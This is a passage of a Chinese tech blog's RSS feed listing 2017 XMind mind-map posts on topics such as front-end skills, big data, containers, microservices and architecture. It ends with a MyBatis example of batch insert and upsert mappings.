      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E4%BA%92%E8%81%94%E7%BD%91%E5%A4%A7%E6%B5%81%E9%87%8F%E6%96%B9%E6%B3%95%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 互联网大流量的方法 图谱   </description>
    </item>
    
    <item>
      <title>前端技能 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%89%8D%E7%AB%AF%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%89%8D%E7%AB%AF%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 前端技能 图谱   </description>
    </item>
    
    <item>
      <title>大数据 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%A4%A7%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%A4%A7%E6%95%B0%E6%8D%AE/</guid>
      <description>   收集到的 大数据 图谱   </description>
    </item>
    
    <item>
      <title>安全秘籍图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%AE%89%E5%85%A8%E7%A7%98%E7%B1%8D%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%AE%89%E5%85%A8%E7%A7%98%E7%B1%8D%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 安全秘籍 图谱   </description>
    </item>
    
    <item>
      <title>容器 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%AE%B9%E5%99%A8%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%AE%B9%E5%99%A8%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 容器 图谱   </description>
    </item>
    
    <item>
      <title>嵌入式 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 嵌入式 图谱   </description>
    </item>
    
    <item>
      <title>开发语言宝典 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%BC%80%E5%8F%91%E8%AF%AD%E9%9F%B3%E5%AE%9D%E5%85%B8%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%BC%80%E5%8F%91%E8%AF%AD%E9%9F%B3%E5%AE%9D%E5%85%B8%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 开发语言宝典 图谱   </description>
    </item>
    
    <item>
      <title>微服务图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E7%A7%98%E7%B1%8D/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E7%A7%98%E7%B1%8D/</guid>
      <description>   收集到的 微服务 图谱   </description>
    </item>
    
    <item>
      <title>架构师图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E6%9E%B6%E6%9E%84%E5%B8%88%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E6%9E%B6%E6%9E%84%E5%B8%88%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 架构师 图谱     收集到的 架构师 图谱   </description>
    </item>
    
    <item>
      <title>架构师方法论图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E6%9E%B6%E6%9E%84%E6%96%B9%E6%B3%95%E8%AE%BA%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E6%9E%B6%E6%9E%84%E6%96%B9%E6%B3%95%E8%AE%BA%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 架构师方法论 图谱   </description>
    </item>
    
    <item>
      <title>移动端测试 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B5%8B%E8%AF%95%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B5%8B%E8%AF%95%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 移动端测试 图谱   </description>
    </item>
    
    <item>
      <title>设计模式图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 设计模式 图谱   </description>
    </item>
    
    <item>
      <title>软件发布 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E8%BD%AF%E4%BB%B6%E5%8F%91%E5%B8%83%E6%B5%81%E7%A8%8B%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E8%BD%AF%E4%BB%B6%E5%8F%91%E5%B8%83%E6%B5%81%E7%A8%8B%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 软件发布 图谱   </description>
    </item>
    
    <item>
      <title>软件工程 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 软件工程 图谱   </description>
    </item>
    
    <item>
      <title>运维 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E8%BF%90%E7%BB%B4%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E8%BF%90%E7%BB%B4%E6%8A%80%E8%83%BD%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 运维 图谱   </description>
    </item>
    
    <item>
      <title>阿里巴巴常用小框架图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/other/xmind-%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E5%B8%B8%E7%94%A8%E5%B0%8F%E6%A1%86%E6%9E%B6%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Tue, 13 Jun 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/other/xmind-%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E5%B8%B8%E7%94%A8%E5%B0%8F%E6%A1%86%E6%9E%B6%E5%9B%BE%E8%B0%B1/</guid>
      <description>   收集到的 阿里巴巴常用小框架 图谱   </description>
    </item>
    
    <item>
      <title>mybatis实例</title>
      <link>https://www.wuxinvip.com/blog/mysql/mybatis-example/</link>
      <pubDate>Fri, 24 Mar 2017 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/mybatis-example/</guid>
      <description>&amp;lt;!-- 批量插入 遇到重复key 改为更新 需求设定--&amp;gt; &amp;lt;insert id=&amp;quot;addBatchDepartment&amp;quot; parameterType=&amp;quot;java.util.List&amp;quot; &amp;gt; INSERT INTO department ( branchId, branchName, common, spellId) VALUES &amp;lt;foreach collection=&amp;quot;list&amp;quot; item=&amp;quot;item&amp;quot; index=&amp;quot;index&amp;quot; separator=&amp;quot;,&amp;quot; &amp;gt; ( #{item.branchId}, #{item.branchName}, #{item.common}, #{item.spellId} ) &amp;lt;/foreach&amp;gt; ON DUPLICATE KEY UPDATE branchId = values(branchId) &amp;lt;/insert&amp;gt;  增
 &amp;lt;insert id=&amp;quot;addStudent&amp;quot; parameterType=&amp;quot;java.util.Map&amp;quot;&amp;gt; insert into student (id,name,age) values ( #{item.id}, #{item.name}, #{item.age} ) &amp;lt;/insert&amp;gt;  批量
 &amp;lt;insert id=&amp;quot;addStudent&amp;quot; parameterType=&amp;quot;java.util.Map&amp;quot;&amp;gt; insert into student (id,name,age,start_time) values &amp;lt;foreach collection=&amp;quot;list&amp;quot; item=&amp;quot;item&amp;quot; index=&amp;quot;index&amp;quot; separator=&amp;quot;,&amp;quot;&amp;gt; ( #{item.</description>
    </item>
    
  </channel>
</rss>